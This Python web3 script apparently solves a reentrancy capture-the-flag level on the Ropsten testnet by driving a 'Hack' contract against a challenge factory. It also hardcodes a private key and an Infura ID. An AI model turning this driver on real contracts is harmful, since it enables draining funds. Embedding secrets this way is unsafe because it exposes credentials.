import json
import time
from web3 import Web3, HTTPProvider

w3 = Web3(HTTPProvider('https://ropsten.infura.io/v3/15253aad1d464c0ea37c6a342fe0e1b3'))
account = w3.toChecksumAddress('0xf75ad09Aea6569e0d54Ccde65b655A598e9b66E4')
w3.eth.defaultAccount = account
privateKey = bytes.fromhex('40a8d082c7e38882d20e7bf174d3a9ea246c82073c7f7f061f4f6bb78bfdbf55')
factoryAddr = w3.toChecksumAddress('0x84Fb598A7E8d58715d3C5F2E789570D7B5B0e290')
factory = w3.eth.contract(address=factoryAddr, abi=json.loads(open('./ReEntrancyFactory.abi').read()))
hackAddr = w3.toChecksumAddress('0xb8f82509657C04fD79FBafA9bdF8B4823EB7FC58')
hack = w3.eth.contract(address=hackAddr, abi=json.loads(open('./Hack.abi').read()))

instances = factory.functions.instances(hackAddr).call()
if instances == '0x0000000000000000000000000000000000000000':
    tx = hack.functions.create(factoryAddr).buildTransaction({'nonce': w3.eth.getTransactionCount(account), 'gas': 300000, 'gasPrice': w3.toWei(1000, 'Gwei'),'value': w3.toWei(0.5, 'ether')})
    signTx = w3.eth.account.signTransaction(tx, private_key=privateKey)
    txHash = w3.eth.sendRawTransaction(signTx.rawTransaction)
    print('transaction -> https://ropsten.etherscan.io/tx/' + hex(int.from_bytes(txHash, 'big')))
    print('wait for transaction success')
    counter = 0
    while 1:
        time.sleep(1)
        instances = factory.functions.instances(hackAddr).call()
        if instances != '0x0000000000000000000000000000000000000000':
            break
        counter += 1
        if counter > 300:
            print('wait too long...')
            exit(0)
    print(f'instances = {instances}')

tx = hack.functions.run(instances).buildTransaction({'nonce': w3.eth.getTransactionCount(account), 'gas': 300000, 'gasPrice': w3.toWei(1000, 'Gwei'), 'value': w3.toWei(0.5, 'ether')})
signTx = w3.eth.account.signTransaction(tx, private_key=privateKey)
txHash = w3.eth.sendRawTransaction(signTx.rawTransaction)
print('transaction -> https://ropsten.etherscan.io/tx/' + hex(int.from_bytes(txHash, 'big')))